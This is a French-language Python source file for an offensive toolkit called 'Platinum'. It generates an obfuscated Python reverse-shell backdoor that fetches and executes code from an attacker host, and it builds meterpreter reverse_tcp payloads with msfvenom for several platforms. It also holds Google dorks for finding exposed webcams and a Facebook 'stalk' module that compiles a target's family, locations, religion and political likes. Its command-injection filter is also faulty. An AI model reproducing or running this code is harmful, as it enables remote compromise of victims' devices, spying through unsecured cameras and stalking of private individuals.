# -*- coding: utf-8 -*-
import os
import sys
def verif_python3():
    version = sys.version[:1]
    if int(version) == 3:
        pass
    else:
        sys.exit("[!] Veuillez lancer la version 3 de python!")
verif_python3()
import time
import random
import webbrowser
import requests
import re
import subprocess
import json
import urllib.request
from terminaltables import SingleTable
from tabulate import tabulate
import traceback
import bs4 as bs
import threading
from colorama import Fore, init, Back
from datetime import date

init()

"""
def verif_root():
    if os.geteuid() != 0:
        sys.exit("[!] Veuillez lancer l'application en mode root!")
    verif_root()
"""
warning = "/!\ "

class ConnexionInternet:

    def __init__(self):
        try:
            requests.get('https://google.com')
            self.internet =  "["+Fore.LIGHTGREEN_EX+"√"+Fore.RESET+"]"
        except:
            self.internet =  "["+Fore.RED+"X"+Fore.RESET+"]"
Internet = ConnexionInternet()


def test_connexion_sans_return():
    try:
        requests.get('http://google.com')
        
    except:
        print("\n\rVous devez avoir une connexion internet pour utiliser cette fonctionnalité!\n\r")
        sys.exit()

headers = {
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
        'referrer': 'https://google.com',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Pragma': 'no-cache'
    }
def lancement_1():
    chaine = "[+] Lancement de Platinum ..."
    charspec = "$*.X^%_/\\#~!?;"
    
    chainehack = ""
    for c in chaine:
        chainehack += c
        r = random.choice(charspec)+random.choice(charspec)+random.choice(charspec)
        if len(chainehack+r) <= len(chaine):
            pass
        else:
            r = ""
        sys.stdout.write('\r'+chainehack+r)
        time.sleep(0.06)

def menu_principal():
    fonctions = """[0] Quitter le programme
[1] Informations sur un individus
[2] Informations sur un numéro de téléphone
[3] Informations sur une adresse
[4] Informations sur un individus
[5] Informations sur un numéro de telephone
[6] Informations sur une adresse
[7] Informations sur un individus
[8] Informations sur un numéro de téléphone
[9] Informations sur une adresse
[>] Page suivante                 (1 sur 4)"""
    pays = """
  Canada
  Canada
  Canada
États-Unis
États-Unis
États-Unis
  France
  France
  France"""
    table_menu1 = [
            ['                 Fonctions', '   Pays'],
            [fonctions, pays]
    ]
    table1 = SingleTable(table_menu1)
    print('\n\r'+table1.table)

th1 = threading.Thread(target=ConnexionInternet)
th2 = threading.Thread(target=lancement_1)
th1.start()
th2.start()
th1.join()
th2.join()

def times():
    date_today = date.today()
    heure = time.strftime("%H:%M:%S")
    ajd = str(date_today)+" "+str(heure)
    ajd = Fore.YELLOW+ajd+Fore.RESET
    return ajd

def banniere_1():
    version = Fore.YELLOW+"2.0"+Fore.RESET
    dev = Fore.CYAN+"Cr4zyB0t"+Fore.RESET
    print(""" /$$$$$$$  /$$             /$$     /$$                                  
| $$__  $$| $$            | $$    |__/                                  
| $$  \ $$| $$  /$$$$$$  /$$$$$$   /$$ /$$$$$$$  /$$   /$$ /$$$$$$/$$$$ 
| $$$$$$$/| $$ |____  $$|_  $$_/  | $$| $$__  $$| $$  | $$| $$_  $$_  $$
| $$____/ | $$  /$$$$$$$  | $$    | $$| $$  \ $$| $$  | $$| $$ \ $$ \ $$
| $$      | $$ /$$__  $$  | $$ /$$| $$| $$  | $$| $$  | $$| $$ | $$ | $$
| $$      | $$|  $$$$$$$  |  $$$$/| $$| $$  | $$|  $$$$$$/| $$ | $$ | $$
|__/      |__/ \_______/   \___/  |__/|__/  |__/ \______/ |__/ |__/ |__/  

Développé par      : {}
Version            : {}
Date et heure      : {}
Connexion Internet : {}""".format(dev, version, times(), Internet.internet))

def clear():
	if os.name == 'nt':
		return os.system('cls')
	else:
		return os.system('clear')
def exit():
    print("\n\rÀ bientôt ...")
    sys.exit()

def check_windows():
    if os.name == "nt":
        print(Fore.RED+"\r\n/!\ Cette fonction n'est pas disponible pour Windows!"+Fore.RESET)
        sys.exit()
    else:
        pass

def menu_msf():
    print("""
+--------------------------------------+
|            OS attack type            |
+--------------------------------------+
| [0] Retour                           |
| [1] Windows                          |
| [2] Linux                            |
| [3] Android                          |
| [4] MacOS                            |
| [5] Python FUD backdoor              |
| [6] PHP server attack                |
+--------------------------------------+
""")


def xss():
    print("Vous ne pouvez pas faire d'injections de commande!")
    sys.exit()



liste = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9','~','!','@','#','$','%','^','&','*','(',')','-','_','=','+','[',']','{','}',';',':',',','.','<','>','/','?' ]

def python_FUD():
    LHOST = str(input("[+][Platinum][choice][Virus Metasploit][LHOST:~$ "))
    if (";" or "&") in LHOST:
        xss()
    else:
        pass
    LPORT = str(input("[+][Platinum][choice][Virus Metasploit][LPORT:~$ "))
    if (";" or "&") in LPORT:
        xss()
    else:
        pass
    
    import random
    
    tot = ''
    compteur = 0
    while compteur < 10000:
        tot = tot+random.choice(liste)
        
        compteur += 1
    python_FUD_0 = """#{}""".format(tot)
    python_FUD_1 = """
import socket
import struct
import time
time.sleep(3)
for x in range(10):
	try:
		victime=socket.socket(2,socket.SOCK_STREAM)
"""
    python_FUD_2 = """		victime.connect(('{}',{}))""".format(LHOST,LPORT)
    python_FUD_3 = """
		break
	except:
		time.sleep(5)
l=struct.unpack('>I',victime.recv(4))[0]
d=victime.recv(l)
while len(d)<l:
	d+=victime.recv(l-len(d))
exec(d,{'s':victime})
"""

    fichier = open("python_FUD.py", "w")
    fichier.write(python_FUD_0)
    fichier.write(python_FUD_1)
    fichier.write(python_FUD_2)
    fichier.write(python_FUD_3)
    fichier.close()

def menu_hack_cam():
    print("""
+-------------------------------------------------------+
|                          Dorks                        |
+-------------------------------------------------------+
| [0] Retour                                            |
| [A] All                                               |
| [1] inurl:viewerframe?mode=motion                     |
| [2] inurl:jpegpull.htm                                |
| [3] intext:"Powered by www.yawcam.com"                |
| [4] intitle:"Yawcam" inurl:8081                       |
| [5] inurl:control/camerainfo                          |
+-------------------------------------------------------+
""")

def play_mp3():
    #pygame.init()
    #hack_sound = pygame.mixer.Sound("hack_cam.ogg")
    #hack_sound.play()
    #subprocess.Popen(['mpg123', '-q', 'hack_cam.mp3']).wait()
    pass

def hack_cam():
    while 1:
        import webbrowser
        clear()
        menu_hack_cam()
        choice_hack_cam = input("[+][Platinum][choice][Hack camera:~$ ")
        new = 2

        url1 = "https://www.google.com/search?client=ubuntu&channel=fs&q=inurl%3Aviewerframe%3Fmode%3Dmotion&ie=utf-8&oe=utf-8"
        url2 = """https://www.google.com/search?client=ubuntu&channel=fs&q=inurl%3Ajpegpull.htm+&ie=utf-8&oe=utf-8"""
        url3 = """https://www.google.com/search?client=ubuntu&channel=fs&q=intext%3A%22Powered+by+www.yawcam.com%22&ie=utf-8&oe=utf-8"""
        url4 = """https://www.google.com/search?client=ubuntu&channel=fs&q=intitle%3A%22Yawcam%22+inurl%3A8081&ie=utf-8&oe=utf-8"""
        url5 = """https://www.google.com/search?q=inurl:control/camerainfo"""

        if choice_hack_cam == "0":
            break
        elif choice_hack_cam == "1":
            webbrowser.open(url1, new=new)
            play_mp3()
    
        elif choice_hack_cam == "2":
            webbrowser.open(url2, new=new)
            #play_mp3()
    
        elif choice_hack_cam == "3":
            webbrowser.open(url3, new=new)
            #play_mp3()

        elif choice_hack_cam == "4":
            webbrowser.open(url4, new=new)
            #play_mp3()

        elif choice_hack_cam == "5":
            webbrowser.open(url5, new=new)
            #play_mp3()

        elif choice_hack_cam == "a" or choice_hack_cam == "A":
            webbrowser.open(url1, new=new)
            webbrowser.open(url2, new=new)
            webbrowser.open(url3, new=new)
            webbrowser.open(url4, new=new)
            webbrowser.open(url5, new=new)
            #play_mp3()
            clear()


        else:
            print(choice_hack_cam,"ne fait pas partit des choix!")
            time.sleep(0.5)



def menu_facebook_sections():
        print("""[0] Retour
[A] ALL
[1] Tags
[2] Information sur la personne 
[3] Lieux visités
[4] Ce que la personne a liker
[5] Ce que la personne a commenté
[6] Infos sur le profils
[7] Intérets globaux
""")
def menu_fb_tags():
    clear()
    print("""
[0] Retour
[A] All the section
[1] Photos
[2] Videos
[3] Publications
""")
def menu_fb_personne():
    clear()
    print("""
[0] Retour
[A] All the section
[1] Famille
[2] Amis
[3] Amis en communs
[4] Travaille
[5] Études
[6] Locaux
""")
def menu_fb_lieux():
    clear()
    print("""
[0] Retour
[A] All the section
[1] Tous
[2] Bars
[3] Restaurants
[4] Magasin
[5] Extérieur
[6] Hotels
[7] Theatre
    """)
def menu_fb_commentaire():
    clear()
    print("""
[0] Retour
[1] Commentaires laisser par la personne
""")
def menu_fb_profile():
    clear()
    print("""
[0] Retour
[A] All the section
[1] Photos
[2] Videos
[3] Publications
[4] Groupes
[5] Futur évènements
[6] évènements passés
[7] Jeux
[8] Apps
    """)
def menu_fb_interets():
    clear()
    print("""
[0] Retour
[A] All the section
[1] Pages aimées
[2] Politiques
[3] Religion
[4] Musiques
[5] Filmes
[6] Livres
[7] Jeux
    """)
def facebook_stalk():
    test_connexion_sans_return()
    while 1:
        fb_victime = input("[+][Platinum][choice][FB_stalk][URL_TARGET:~$ ")
        profile_par_id = "https://www.facebook.com/profile.php?id="
        profile_sans_id = "https://www.facebook.com/"

        if profile_par_id in fb_victime:
            ID = fb_victime.replace("https://www.facebook.com/profile.php?id=", '')
            sauce = urllib.request.urlopen(fb_victime).read().decode('utf-8')
            soup = bs.BeautifulSoup(sauce,'lxml')
            nom = soup.title.text
            nom = nom.replace(' | Facebook', '')
            break
        elif profile_sans_id in fb_victime:
            try:

                page = requests.get(fb_victime).content.decode('utf-8')
                findId = re.search(r"entity_id=([0-9]+)", page).group(0)
                sauce = urllib.request.urlopen(fb_victime).read().decode('utf-8')
                soup = bs.BeautifulSoup(sauce,'lxml')
                nom = soup.title.text
                nom = nom.replace(' | Facebook', '')
                

                if findId:
                    facebookID = findId.replace("entity_id=", '')
                    ID = facebookID
                    break
                else:
                    print("Vous devez entrer l'URL du profile de votre victime!")
                    continue
            except:
                print("Une erreur est survenue!")
                connaissez_vous_id = input("Connaissez-vous l'ID? (o/n) : ")
                if connaissez_vous_id == ("o" or "O"):
                    ID = input("[+][Platinum][choice][FB_stalk][ID:~$ ")
                    break
                elif connaissez_vous_id == ("n"or "N"):
                    print("Pour connaitre l'ID d'une personne consultez la documentation! (README.MD)")
                    sys.exit()
                else:
                    print(connaissez_vous_id, "ne fait pas partit de choix!")
                    continue
        else:
            print("Vous devez entrer l'URL du profile de votre victime!")


    url1 = "https://www.facebook.com/search/{}/photos-of/intersect/".format(ID)
    url2 = "https://www.facebook.com/search/{}/videos-of/intersect/".format(ID)
    url3 = "https://www.facebook.com/search/{}/stories-tagged/intersect/".format(ID)

    url4 = "https://www.facebook.com/search/{}/relatives/intersect/".format(ID)
    url5 = "https://www.facebook.com/search/{}/friends/intersect/".format(ID)
    url6 = "https://www.facebook.com/search/{}/friends/friends/intersect/".format(ID)
    url7 = "https://www.facebook.com/search/{}/employees/intersect/".format(ID)
    url8 = "https://www.facebook.com/search/{}/schools-attended/ever-past/intersect/students/intersect/".format(ID)
    url9 = "https://www.facebook.com/search/{}/current-cities/residents-near/present/intersect/".format(ID)

    url10 = "https://www.facebook.com/search/{}/places-visited/".format(ID)
    url11 = "https://www.facebook.com/search/{}/places-visited/110290705711626/places/intersect/".format(ID)
    url12 = "https://www.facebook.com/search/{}/places-visited/273819889375819/places/intersect/".format(ID)
    url13 = "https://www.facebook.com/search/{}/places-visited/200600219953504/places/intersect/".format(ID)
    url14 = "https://www.facebook.com/search/{}/places-visited/935165616516865/places/intersect/".format(ID)
    url15 = "https://www.facebook.com/search/{}/places-visited/164243073639257/places/intersect/".format(ID)
    url16 = "https://www.facebook.com/search/{}/places-visited/192511100766680/places/intersect/".format(ID)

    url17 = "https://www.facebook.com/search/{}/photos-liked/intersect/".format(ID)
    url18 = "https://www.facebook.com/search/{}/videos-liked/intersect/".format(ID)
    url19 = "https://www.facebook.com/search/{}/stories-liked/intersect/".format(ID)

    url20 = "https://www.facebook.com/search/{}/photos-commented/intersect/".format(ID)

    url21 = "https://www.facebook.com/search/{}/photos-by//".format(ID)
    url22 = "https://www.facebook.com/search/{}/videos-by/".format(ID)
    url23 = "https://www.facebook.com/search/{}/stories-by/".format(ID)
    url24 = "https://www.facebook.com/search/{}/groups/".format(ID)
    url25 = "https://www.facebook.com/search/{}/events-joined/".format(ID)
    url26 = "https://www.facebook.com/search/{}/events-joined/in-past/date/events/intersect/".format(ID)
    url27 = "https://www.facebook.com/search/{}/apps-used/game/apps/intersect/".format(ID)
    url28 = "https://www.facebook.com/search/{}/places-visited/192511100766680/apps-used/".format(ID)

    url29 = "https://www.facebook.com/search/{}/pages-liked/intersect/".format(ID)
    url30 = "https://www.facebook.com/search/{}/pages-liked/161431733929266/pages/intersect/".format(ID)
    url31 = "https://www.facebook.com/search/{}/pages-liked/religion/pages/intersect/".format(ID)
    url32 = "https://www.facebook.com/search/{}/pages-liked/musician/pages/intersect/".format(ID)
    url33 = "https://www.facebook.com/search/{}/pages-liked/movie/pages/intersect/".format(ID)
    url34 = "https://www.facebook.com/search/{}/pages-liked/book/pages/intersect/".format(ID)
    url35 = "https://www.facebook.com/search/{}/places-liked/".format(ID)


    while 1:
        print("\n\rNom de la personne : [{}]\n\r".format(nom))
        menu_facebook_sections()
        new = 2
        fb_section = input("[+][Platinum][choice][FB_stalk][Section:~$ ")
        if fb_section == "0":
            break


        elif fb_section == "1":
            menu_fb_tags()
            fb_tags = input("[+][Platinum][choice][FB_stalk][Section][Tags:~$ ")
            if fb_tags == "0":
                continue
            elif fb_tags == "a" or fb_tags == "A":
                webbrowser.open(url1, new=new)
                webbrowser.open(url2, new=new)
                webbrowser.open(url3, new=new)
            elif fb_tags == "1":
                webbrowser.open(url1, new=new)
            elif fb_tags == "2":
                webbrowser.open(url2, new=new)
            elif fb_tags == "3":
                webbrowser.open(url3, new=new)
            else:
                print(fb_tags,"ne fait pas partit des choix!")
                continue


        elif fb_section == "2":
            menu_fb_tags()
            fb_tags = input("[+][Platinum][choice][FB_stalk][Section][Personne:~$ ")
            if fb_tags == "0":
                continue
            elif fb_tags == "a" or fb_tags == "A":
                webbrowser.open(url4, new=new)
                webbrowser.open(url5, new=new)
                webbrowser.open(url6, new=new)
                webbrowser.open(url7, new=new)
                webbrowser.open(url8, new=new)
                webbrowser.open(url9, new=new)
            elif fb_tags == "1":
                webbrowser.open(url4, new=new)
            elif fb_tags == "2":
                webbrowser.open(url5, new=new)
            elif fb_tags == "3":
                webbrowser.open(url6, new=new)
            elif fb_tags == "4":
                webbrowser.open(url7, new=new)
            elif fb_tags == "5":
                webbrowser.open(url8, new=new)
            elif fb_tags == "6":
                webbrowser.open(url9, new=new)
            else:
                print(fb_tags,"ne fait pas partit des choix!")
                continue


            
        elif fb_section == "3":
            menu_fb_lieux()
            fb_tags = input("[+][Platinum][choice][FB_stalk][Section][Lieux:~$ ")
            if fb_tags == "0":
                continue
            elif fb_tags == "a" or fb_tags == "A":
                webbrowser.open(url10, new=new)
                webbrowser.open(url11, new=new)
                webbrowser.open(url12, new=new)
                webbrowser.open(url13, new=new)
                webbrowser.open(url14, new=new)
                webbrowser.open(url15, new=new)
                webbrowser.open(url16, new=new)
            elif fb_tags == "1":
                webbrowser.open(url10, new=new)
            elif fb_tags == "2":
                webbrowser.open(url11, new=new)
            elif fb_tags == "3":
                webbrowser.open(url12, new=new)
            elif fb_tags == "4":
                webbrowser.open(url13, new=new)
            elif fb_tags == "5":
                webbrowser.open(url14, new=new)
            elif fb_tags == "6":
                webbrowser.open(url15, new=new)
            elif fb_tags == "7":
                webbrowser.open(url16, new=new)
            else:
                print(fb_tags,"ne fait pas partit des choix!")
                continue

        elif fb_section == "4":
            menu_fb_tags()
            fb_tags = input("[+][Platinum][choice][FB_stalk][Section][Liked:~$ ")
            if fb_tags == "0":
                continue
            elif fb_tags == "a" or fb_tags == "A":
                webbrowser.open(url17, new=new)
                webbrowser.open(url18, new=new)
                webbrowser.open(url19, new=new)
            elif fb_tags == "1":
                webbrowser.open(url17, new=new)
            elif fb_tags == "2":
                webbrowser.open(url18, new=new)
            elif fb_tags == "3":
                webbrowser.open(url19, new=new)
            else:
                print(fb_tags,"ne fait pas partit des choix!")
                continue
        
        elif fb_section == "5":
            menu_fb_commentaire()
            fb_tags = input("[+][Platinum][choice][FB_stalk][Section][Commentaires:~$ ")
            if fb_tags == "0":
                continue
            elif fb_tags == "1":
                webbrowser.open(url20, new=new)

        elif fb_section == "6":
            menu_fb_profile()
            fb_tags = input("[+][Platinum][choice][FB_stalk][Section][Profile:~$ ")
            if fb_tags == "0":
                continue
            elif fb_tags == "a" or fb_tags == "A":
                webbrowser.open(url21, new=new)
                webbrowser.open(url22, new=new)
                webbrowser.open(url23, new=new)
                webbrowser.open(url24, new=new)
                webbrowser.open(url25, new=new)
                webbrowser.open(url26, new=new)
                webbrowser.open(url27, new=new)
                webbrowser.open(url28, new=new)
            elif fb_tags == "1":
                webbrowser.open(url21, new=new)
            elif fb_tags == "2":
                webbrowser.open(url22, new=new)
            elif fb_tags == "3":
                webbrowser.open(url23, new=new)
            elif fb_tags == "4":
                webbrowser.open(url24, new=new)
            elif fb_tags == "5":
                webbrowser.open(url25, new=new)
            elif fb_tags == "6":
                webbrowser.open(url26, new=new)
            elif fb_tags == "7":
                webbrowser.open(url27, new=new)
            elif fb_tags == "8":
                webbrowser.open(url28, new=new)
            else:
                print(fb_tags,"ne fait pas partit des choix!")
                continue
        

        elif fb_section == "7":
            menu_fb_interets()
            fb_tags = input("[+][Platinum][choice][FB_stalk][Section][Intérets:~$ ")
            if fb_tags == "0":
                continue
            elif fb_tags == "a" or fb_tags == "A":
                webbrowser.open(url29, new=new)
                webbrowser.open(url30, new=new)
                webbrowser.open(url31, new=new)
                webbrowser.open(url32, new=new)
                webbrowser.open(url33, new=new)
                webbrowser.open(url34, new=new)
                webbrowser.open(url35, new=new)
            elif fb_tags == "1":
                webbrowser.open(url29, new=new)
            elif fb_tags == "2":
                webbrowser.open(url30, new=new)
            elif fb_tags == "3":
                webbrowser.open(url31, new=new)
            elif fb_tags == "4":
                webbrowser.open(url32, new=new)
            elif fb_tags == "5":
                webbrowser.open(url33, new=new)
            elif fb_tags == "6":
                webbrowser.open(url34, new=new)
            elif fb_tags == "7":
                webbrowser.open(url35, new=new)
            else:
                print(fb_tags,"ne fait pas partit des choix!")
                continue
        elif fb_section == "a" or fb_section == "A":
            certitude = input("Voulez vous vraiment faire ça? (o/n) : ")
            if certitude == ("o" or "O"):
                stalk_fichier = input("Voulez vous mettre le contenue dans un fichier txt? (o/n) : ")
                if stalk_fichier == ("o" or "O"):
                    nom_stalk_fichier = str(input("[+][Platinum][choice][FB_stalk][Section][ALL][FileName:~$ "))
                    nom_stalk_fichier += str(".txt")
                    fichier_stalk = open(nom_stalk_fichier, "w")
                    fichier_stalk.write(url1+"\n")
                    fichier_stalk.write(url2+"\n")
                    fichier_stalk.write(url3+"\n")
                    fichier_stalk.write(url4+"\n")
                    fichier_stalk.write(url5+"\n")
                    fichier_stalk.write(url6+"\n")
                    fichier_stalk.write(url7+"\n")
                    fichier_stalk.write(url8+"\n")
                    fichier_stalk.write(url9+"\n")
                    fichier_stalk.write(url10+"\n")
                    fichier_stalk.write(url11+"\n")
                    fichier_stalk.write(url12+"\n")
                    fichier_stalk.write(url13+"\n")
                    fichier_stalk.write(url14+"\n")
                    fichier_stalk.write(url15+"\n")
                    fichier_stalk.write(url16+"\n")
                    fichier_stalk.write(url17+"\n")
                    fichier_stalk.write(url18+"\n")
                    fichier_stalk.write(url19+"\n")
                    fichier_stalk.write(url20+"\n")
                    fichier_stalk.write(url21+"\n")
                    fichier_stalk.write(url22+"\n")
                    fichier_stalk.write(url23+"\n")
                    fichier_stalk.write(url24+"\n")
                    fichier_stalk.write(url25+"\n")
                    fichier_stalk.write(url26+"\n")
                    fichier_stalk.write(url27+"\n")
                    fichier_stalk.write(url28+"\n")
                    fichier_stalk.write(url29+"\n")
                    fichier_stalk.write(url30+"\n")
                    fichier_stalk.write(url31+"\n")
                    fichier_stalk.write(url32+"\n")
                    fichier_stalk.write(url33+"\n")
                    fichier_stalk.write(url34+"\n")
                    fichier_stalk.write(url35+"\n")


                    fichier_stalk.close()
                    pass
                elif stalk_fichier == ("n" or "N"):
                    pass
                else:
                    print(stalk_fichier,"ne fait pas partit des choix!")

                stalk_browser = input("Voulez vous ouvrir les pages dans un navigateurs? (o/n) : ")
                if stalk_browser == ("o" or "O"):
                    webbrowser.open(url1, new=new)
                    webbrowser.open(url2, new=new)
                    webbrowser.open(url3, new=new)
                    webbrowser.open(url4, new=new)
                    webbrowser.open(url5, new=new)
                    webbrowser.open(url6, new=new)
                    webbrowser.open(url7, new=new)
                    webbrowser.open(url8, new=new)
                    webbrowser.open(url9, new=new)
                    webbrowser.open(url10, new=new)
                    webbrowser.open(url11, new=new)
                    webbrowser.open(url12, new=new)
                    webbrowser.open(url13, new=new)
                    webbrowser.open(url14, new=new)
                    webbrowser.open(url15, new=new)
                    webbrowser.open(url16, new=new)
                    webbrowser.open(url17, new=new)
                    webbrowser.open(url18, new=new)
                    webbrowser.open(url19, new=new)
                    webbrowser.open(url20, new=new)
                    webbrowser.open(url21, new=new)
                    webbrowser.open(url22, new=new)
                    webbrowser.open(url23, new=new)
                    webbrowser.open(url24, new=new)
                    webbrowser.open(url25, new=new)
                    webbrowser.open(url26, new=new)
                    webbrowser.open(url27, new=new)
                    webbrowser.open(url28, new=new)
                    webbrowser.open(url29, new=new)
                    webbrowser.open(url30, new=new)
                    webbrowser.open(url31, new=new)
                    webbrowser.open(url32, new=new)
                    webbrowser.open(url33, new=new)
                    webbrowser.open(url34, new=new)
                    webbrowser.open(url35, new=new)

                elif stalk_browser == ("n" or "N"):
                    continue
                else:
                    continue


            elif certitude == ("n"or"N"):
                continue
            else:
                print(certitude, "ne fait pas partit des choix!")

        else:
            print(fb_section,"ne fait pas partit des choix!")
            continue 


def whois():
    clear()
    whois_ip = input("[+][Platinum][choice][Whois][IP:~$ ")
    if (";" or "&") in whois_ip:
        xss()
    else:
        pass
    CMD = "whois {}".format(whois_ip)
    os.system(CMD)
    input("Appuyez sur [ENTRER] pour continuer : ")

def metasploit_virus():
    while 1:
        clear()
        menu_msf()
        choice_msf = input("[+][Platinum][choice][Virus Metasploit:~$ ")
        if choice_msf == "0":
            break
        elif choice_msf == "1":
            LHOST = str(input("[+][Platinum][choice][Virus Metasploit][LHOST:~$ "))
            if (";" or "&") in LHOST:
                xss()
            else:
                pass
            LPORT = str(input("[+][Platinum][choice][Virus Metasploit][LPORT:~$ "))
            if (";" or "&") in LPORT:
                xss()
            else:
                pass
            name = str(input("[+][Platinum][choice][Virus Metasploit][Name file:~$ "))
            CMD = ("msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST={} LPORT={} >{}.exe".format(LHOST,LPORT,name))
            os.system(CMD)


        elif choice_msf == "2":
            LHOST = str(input("[+][Platinum][choice][Virus Metasploit][LHOST:~$ "))
            if (";" or "&") in LHOST:
                xss()
            else:
                pass
            LPORT = str(input("[+][Platinum][choice][Virus Metasploit][LPORT:~$ "))
            if (";" or "&") in LPORT:
                xss()
            else:
                pass
            name = str(input("[+][Platinum][choice][Virus Metasploit][Name file:~$ "))
            CMD = ("msfvenom -p linux/meterpreter/reverse_tcp -f elf LHOST={} LPORT={} >{}.elf".format(LHOST,LPORT,name))
            os.system(CMD)


        elif choice_msf == "3":
            LHOST = str(input("[+][Platinum][choice][Virus Metasploit][LHOST:~$ "))
            if (";" or "&") in LHOST:
                xss()
            else:
                pass
            LPORT = str(input("[+][Platinum][choice][Virus Metasploit][LPORT:~$ "))
            if (";" or "&") in LPORT:
                xss()
            else:
                pass
            name = str(input("[+][Platinum][choice][Virus Metasploit][Name file:~$ "))
            CMD = ("msfvenom -p android/meterpreter/reverse_tcp -f apk LHOST={} LPORT={} >{}.apk".format(LHOST,LPORT,name))
            os.system(CMD)
        elif choice_msf == "4":
            LHOST = str(input("[+][Platinum][choice][Virus Metasploit][LHOST:~$ "))
            if (";" or "&") in LHOST:
                xss()
            else:
                pass
            LPORT = str(input("[+][Platinum][choice][Virus Metasploit][LPORT:~$ "))
            if (";" or "&") in LPORT:
                xss()
            else:
                pass
            name = str(input("[+][Platinum][choice][Virus Metasploit][Name file:~$ "))
            CMD = ("""msfvenom -a x86 --platform OSX -p osx/x86/isight/bind_tcp -b "\x00" -f elf LHOST={} LPORT={} >{}.elf""".format(LHOST,LPORT,name))
        elif choice_msf == "5":
            python_FUD()
        
        elif choice_msf == "6":
            LHOST = str(input("[+][Platinum][choice][Virus Metasploit][LHOST:~$ "))
            if (";" or "&") in LHOST:
                xss()
            else:
                pass
            LPORT = str(input("[+][Platinum][choice][Virus Metasploit][LPORT:~$ "))
            if (";" or "&") in LPORT:
                xss()
            else:
                pass
            name = str(input("[+][Platinum][choice][Virus Metasploit][Name file:~$ "))
            CMD = ("""msfvenom -p php/meterpreter/reverse_tcp -f php LHOST={} LPORT={} >{}.php""".format(LHOST,LPORT,name))
        

        else:
            print(choice_msf,"ne fait pas partit des choix!")
def menu_secondaire():
    fonctions = """[0] Quitter le programme
[1] Informations sur un individus (facebook)
[2] Informations sur une carte de crédit/debit 
[3] Informations sur un pseudo
[4] Recherche Google
[5] Tracer numero de telephone
[6] Vérifier si vous avez un compte piraté
[7] Déchiffreur de hash en ligne
[8] Virus Metasploit
[9] Console Metasploit
[<] Page précédente
[>] Page suivante                     (2 sur 4)"""
    table_menu2 = [
            ['                   Fonctions'],
            [fonctions]
    ]
    table2 = SingleTable(table_menu2)
    print(table2.table)


def pages_jaunes_ca_decode(requete='', requetenum=''):
    if requete == '':
        soup = bs.BeautifulSoup(requetenum,'lxml')
        name = ''
        telephone = ''
        addr = ''
        city_a = ''
        prov_a = ''
        code_a = ''
        for p in soup.find_all('div', class_="person-search__table--data person-search__table--cell person-search__table--name"):
                name = name+str(p.text)+"\n"
        for div in soup.find_all('div', class_="person-search__table--data person-search__table--cell person-search__table--phoneNumber"):
                telephone = telephone+str(div.text)+"\n"
        for tel in soup.find_all('div', class_="person-search__table--data person-search__table--cell person-search__table--street"):
                addr = addr+str(tel.text)+"\n"
        for city in soup.find_all('div', class_="person-search__table--data person-search__table--cell person-search__table--city"):
                city_a = city_a+str(city.text)+"\n"
        for prov in soup.find_all('div', class_="person-search__table--data person-search__table--cell person-search__table--province"):
                prov_a = prov_a+str(prov.text)+"\n"
        for code in soup.find_all('div', class_="person-search__table--data person-search__table--cell person-search__table--postalCode"):
                code_a = code_a+str(code.text)+"\n"
        name = name[:-1]
        addr = addr[:-1]
        telephone = telephone[:-1]
        city_a = city_a[:-1]
        prov_a = prov_a[:-1]
        code_a = code_a[:-1]
        if name == '':
            print(Fore.RED+"\n\r"+warning+"Aucun résultat!"+Fore.RESET)
        else:
            table_data = [
                    ['Nom', 'Adresse', 'Téléphone', 'Ville', 'Province', 'Code Postale'],
                    [name, addr, telephone, city_a, prov_a, code_a]
            ]
            table = SingleTable(table_data)
            print(table.table)
    else:
        soup = bs.BeautifulSoup(requete,'lxml')

        name = ''
        telephone = ''
        addr = ''

        for p in soup.find_all('h2', class_="c411ListedName"):
                name = name+str(p.text)+"\n"
        for div in soup.find_all('span', class_="c411Phone"):
                telephone = telephone+str(div.text)+"\n"
        for tel in soup.find_all('span', class_="adr"):
                addr = addr+str(tel.text)+"\n"
        name = name[:-1]
        telephone = telephone[:-1]
        addr = addr[:-1]
        if name == '':
            print(Fore.RED+"\n\r"+warning+"Aucun résultat!"+Fore.RESET)
        else:
            table_data = [
                    ['Nom', 'Adresse', 'Téléphone'],
                    [name, addr, telephone]
            ]
            
            table = SingleTable(table_data)
            print(table.table)



def pj_ca_numero():
    numero = input("[+][Platinum][choice][Info Personne][Numéro:~$ ")
    numero = numero.replace(" ","")
    url = "https://www.pagesjaunes.ca/search/si/1/{}/".format(numero)
    try:
        requetenum = urllib.request.urlopen(url).read().decode('utf-8')
        pages_jaunes_ca_decode(requete='', requetenum=requetenum)
    except urllib.error.URLError:
        print(Fore.RED+warning+"La connexion à été interrompue!"+Fore.RESET)
    except:
        print(Fore.RED+warning+"Une erreur est survenue!"+Fore.RESET)
    input("\n\rAppuyez sur [ENTRER] pour continuer : ")


def pj_ca_personne():
    name = input("[+][Platinum][choice][Info Personne][Prenom et Nom:~$ ")
    name = name.replace(" ", '%20')
    ville = input("[+][Platinum][choice][Info Personne][Ville:~$ ")

    url = "http://www.fr.canada411.ca/search/si/1/{}/{}/?pgLen=25".format(name, ville)
    try:
        requete = urllib.request.urlopen(url).read().decode('utf-8')
        pages_jaunes_ca_decode(requete=requete)
    except urllib.error.URLError:
        print(Fore.RED+warning+"La connexion à été interrompue!"+Fore.RESET)
    except:
        print(Fore.RED+warning+"Une erreur est survenue!"+Fore.RESET)
    input("\n\rAppuyez sur [ENTRER] pour continuer : ")


def pj_ca_adresse():
    maison = input("[+][Platinum][choice][Info Personne][Numéro de maison:~$ ")
    rue = input("[+][Platinum][choice][Info Personne][Rue:~$ ")
    ville = input("[+][Platinum][choice][Info Personne][Ville:~$ ")
    province = input("[+][Platinum][choice][Info Personne][Province:~$ ")
    url = "http://www.fr.canada411.ca/search/?stype=ad&st={}%2C{}&ci={}&pv={}&pc=".format(maison, rue, ville, province)
    url = url.replace(" ", "+")
    try:
        requete = urllib.request.urlopen(url).read().decode('utf-8')
